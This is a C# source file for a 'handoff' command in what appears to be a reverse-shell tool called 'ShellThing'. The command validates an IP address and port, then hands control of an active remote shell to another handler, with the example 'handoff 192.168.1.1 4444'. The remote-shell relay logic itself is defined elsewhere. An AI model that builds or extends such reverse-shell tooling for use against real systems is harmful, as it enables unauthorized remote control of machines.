using System;
using System.Collections.Generic;
using System.Text;

namespace ShellThing
{
    class HandoffCommand: ICommand
    {
        TcpReverseConnection connection;

        public void Execute(TcpReverseConnection connection, string[] commandArguments)
        {
            this.connection = connection;

            //Validate command line arguments before
            if (ValidateArguments(commandArguments))
            {
                connection.HandoffConenection(commandArguments[1], commandArguments[2]);
            }
            else
            {
                connection.SendData("Handoff error - incorrect number of arguments supplied\n");
            }
        }

        public bool ValidateArguments(string[] commandArguments)
        {
            if (commandArguments.Length == 3)
            {
                if (TcpReverseConnection.ValidateIpAddress(commandArguments[1]) && TcpReverseConnection.ValidatePortNumber(commandArguments[2]))
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }

        public Dictionary<string, string> Help(bool includeSyntax)
        {
            Dictionary<string, string> helpText = new Dictionary<string, string>();

            helpText.Add("handoff", "Hand control of this shell off to another handler");

            if (includeSyntax == true)
            {
                helpText.Add("syntax", "handoff <ip address> <port>");
                helpText.Add("example", "handoff 192.168.1.1 4444");
            }

            return helpText;
        }
    }
}
